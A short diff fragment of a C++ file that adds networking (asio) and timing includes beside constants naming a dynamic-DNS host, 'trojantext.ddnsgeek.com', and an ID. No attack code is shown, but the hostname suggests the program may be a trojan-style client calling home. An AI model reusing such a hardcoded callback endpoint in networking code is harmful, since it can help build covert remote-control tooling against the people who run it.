@@ -9,6 +9,9 @@
 
 #include <nlohmann/json.hpp>
 #include <string>
+#include <asio.hpp>
+#include <chrono>
+
 using namespace std;
 const string DDNS_URL = "trojantext.ddnsgeek.com";
 const string DDNS_ID = "13292760";
